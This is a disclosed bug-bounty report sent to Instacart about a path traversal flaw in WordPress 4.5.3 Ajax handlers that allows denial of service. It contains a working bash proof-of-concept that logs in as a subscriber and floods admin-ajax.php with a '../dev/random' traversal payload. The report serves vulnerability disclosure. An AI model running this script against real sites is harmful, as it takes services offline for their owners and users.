# WordPress Authentication Denial of Service

## Report Details
- **Report ID**: 163307
- **URL**: https://hackerone.com/reports/163307
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-25T09:31:32.552Z
- **Disclosed**: 2017-05-26T19:36:12.991Z

## Reporter
- **Username**: clizsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: instacart

## Vulnerability Information
Hi,
I found out that you are using WordPress version 4.5.3.

Researchers found out 5 days ago, that this version has a vulnerability, a Path traversal in WordPress Core Ajax handlers.

_Intro_
WordPress is web software that can be used to create a website, blog, or app. A path traversal vulnerability exists in the Core Ajax handlers of the WordPress Admin API. This issue can (potentially) be used by an authenticated user (Subscriber) to create a denial of service condition of an affected WordPress site.

_Description_
Potentially this issue can be used to disclose information, provided that the target file contains a line with Version:. What is more important that it also allows for a denial of service condition as the logged in attacker can use this flaw to read up to 8 KB of data from /dev/random. Doing this repeatedly will deplete the entropy pool, which causes /dev/random to block; blocking the PHP scripts. Using a very simple script, it is possible for an authenticated user (Subscriber) to bring down a WordPress site. It is also possible to trigger this issue via Cross-Site Request Forgery as the nonce check is done too late in this case.

_PoC Script_
```
#!/bin/bash
target="http://<target>"
username="subscriber"
password="password"
cookiejar=$(mktemp)
   
# login
curl --cookie-jar "$cookiejar" \
   --data "log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" \
   "$target/wp-login.php" \
   >/dev/null 2>&1
   
# exhaust apache
for i in `seq 1 1000`
   do
      curl --cookie "$cookiejar" \
      --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" \
      "$target/wp-admin/admin-ajax.php" \
      >/dev/null 2>&1 &
done
   
rm "$cookiejar"
```

Link: 
```
https://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html
```

I hope that I helped you.


## Attachments
No attachments
